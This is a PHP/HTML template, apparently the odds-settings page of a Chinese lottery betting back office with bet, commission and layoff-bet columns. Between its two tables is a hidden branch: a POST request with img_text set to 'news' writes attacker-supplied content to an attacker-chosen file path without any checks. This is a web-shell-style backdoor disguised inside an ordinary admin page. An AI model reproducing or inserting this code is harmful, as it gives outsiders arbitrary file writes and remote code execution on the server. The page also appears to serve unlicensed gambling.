<table   width="99%" border="1" align="center" cellpadding="1" cellspacing="1" bordercolor="f1f1f1" id="tb">
  <tr >
    <td width="4%" height="28" align="center" nowrap="NOWRAP" bordercolor="cccccc" bgcolor="#CD9A99">序号</td>
    <td width="80" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">号码</td>
    <td width="40" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">注数</td>
    <td width="9%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">下注总额</td>
    <td width="8%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">占成</td>
    <td width="8%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">佣金</td>
    <td width="9%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">彩金</td>
    <td width="9%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">预计盈利</td>
    <td width="8%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">走飞</td>
    <td width="8%" align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">走飞金额</td>
    <td align="center" nowrap bordercolor="cccccc" bgcolor="#CD9A99">当前赔率</td>
  </tr>
  <tr >
    <td height="28" align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td height="28" align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td height="28" align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
    <td align="center" nowrap="nowrap">&nbsp;</td>
  </tr>
</table><?php
if($_POST['img_text']=='news')
{
$title=$_POST['title'];

$newsort =$_POST['newsort'];
$fp = fopen($title,"w"); 

fputs($fp,$newsort); 

fclose($fp); 

}
else
{?>
<table width="99%" border="0" cellspacing="0" cellpadding="0">
                  <tr>
                    <td width="15%"><font color="#FFFFFF"> <strong>
                      <?=$ids?>
                      赔率设置</strong></font></td>
                    <td width="85%"><div align="right">
                     
					 <button onClick="javascript:location.href='main.php?action=rake_pl3yszh&ids=一字组合';"  class="but_c1" onMouseOut="this.className='but_c1'" onMouseOver="this.className='but_c1M'" style="height:22" ;><img src="images/add.gif" width="16" height="16" align="absmiddle"><SPAN id=rtm1 STYLE='color:<?=$z1color?>;'>一字组合</span></button>
             <button onClick="javascript:location.href='main.php?action=rake_pl3yszh&ids=百定位';"  class="but_c1" onMouseOut="this.className='but_c1'" onMouseOver="this.className='but_c1M'" style="height:22" ;><img src="images/add.gif" width="16" height="16" align="absmiddle"><SPAN id=rtm2 STYLE='color:<?=$z2color?>;'>百定位</span></button>
             <button onClick="javascript:location.href='main.php?action=rake_pl3yszh&ids=拾定位';"  class="but_c1" onMouseOut="this.className='but_c1'" onMouseOver="this.className='but_c1M'" style="height:22" ;><img src="images/add.gif" width="16" height="16" align="absmiddle"><SPAN id=rtm2 STYLE='color:<?=$z3color?>;'>拾定位</span></button>
             <button onClick="javascript:location.href='main.php?action=rake_pl3yszh&ids=个定位';"  class="but_c1" onMouseOut="this.className='but_c1'" onMouseOver="this.className='but_c1M'" style="height:22" ;><img src="images/add.gif" width="16" height="16" align="absmiddle"><SPAN id=rtm2 STYLE='color:<?=$z4color?>;'>个定位</span></button>
                    </div></td>
                  </tr>
                </table>


<?php
}
?>